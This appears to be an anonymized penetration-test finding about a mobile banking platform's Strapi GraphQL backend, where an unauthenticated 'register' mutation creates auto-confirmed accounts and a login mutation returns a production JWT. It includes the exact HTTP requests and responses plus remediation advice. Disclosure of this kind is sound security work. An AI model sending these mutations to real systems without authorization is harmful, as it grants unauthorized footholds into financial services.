---
title: Unauthenticated User Registration & Auto-Confirmed JWT Minting
target: Pan-African Mobile Banking Platform
category: API & GraphQL Security
severity: High
cvss: 7.5
tags: [graphql, open-registration, jwt, strapi, fintech]
date: 2026-02-05
---

# ⚡ Open Registration & Auto-Confirmed JWT Minting (Anonymized)

> ⚠️ **Context:** Discovered during security assessment of a mobile banking and financial services CMS backend.  
> 🛡️ **Confidentiality:** Target organization anonymized as **"Pan-African Mobile Banking Platform"**. All hostnames, JWT tokens, and user IDs are **[REDACTED]**.

---

## 🎯 Target Scope
- **Organization Type:** Pan-African Mobile Money & Telecom Banking Platform
- **Component:** Production CMS Backend (Strapi + Apollo GraphQL Engine)
- **Affected Endpoint:** `POST /graphql` (Mutation: `register`)

---

## ⚠️ Impact Summary
- **Severity:** High (CVSS 7.5 - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N`)
- **Impact:** Unrestricted user account creation on the live production CMS with automatic email confirmation.
- Any unauthenticated user could issue a GraphQL registration mutation, instantly receive verified account status, and obtain a valid production JWT bearer token.
- Sequentially assigned user IDs (`ID: 1354`) confirmed an active production deployment with over 1,350 live registered entities.
- Provided an authenticated foothold into the internal GraphQL schema (`me`, `uploadFiles`, `i18NLocales`).

---

## 🧪 Proof of Concept Flow (Sanitized)

### Step 1: Execute Unauthenticated Register Mutation
```http
POST /graphql HTTP/1.1
Host: admin.[redacted-fintech].net
Content-Type: application/x-www-form-urlencoded

query=mutation{register(input:{username:"audit_test_user",email:"audit_probe@example.com",password:"SecurePass123!"}){user{username email}}}
```

### Step 2: Response Confirms Immediate Auto-Confirmation
```json
{
  "data": {
    "register": {
      "user": {
        "username": "audit_test_user",
        "email": "audit_probe@example.com"
      }
    }
  }
}
```

### Step 3: Login to Obtain Production JWT Bearer Token
```http
POST /graphql HTTP/1.1
Host: admin.[redacted-fintech].net
Content-Type: application/x-www-form-urlencoded

query=mutation{login(input:{identifier:"audit_probe@example.com",password:"SecurePass123!"}){jwt user{username email confirmed blocked}}}
```
**Response:**
```json
{
  "data": {
    "login": {
      "jwt": "[REDACTED_PRODUCTION_JWT_TOKEN]",
      "user": {
        "username": "audit_test_user",
        "email": "audit_probe@example.com",
        "confirmed": true,
        "blocked": false
      }
    }
  }
}
```

---

## 🛡️ Remediation
1. **Disable Public Registration Mutations:** Turn off public self-registration on production CMS GraphQL endpoints.
2. **Mandate Out-of-Band Email Confirmation:** Ensure accounts remain in an inactive/unconfirmed state until verified via secure email token.
3. **Network Boundary Isolation:** Restrict the administrative CMS backend behind internal VPNs or corporate zero-trust gateways.
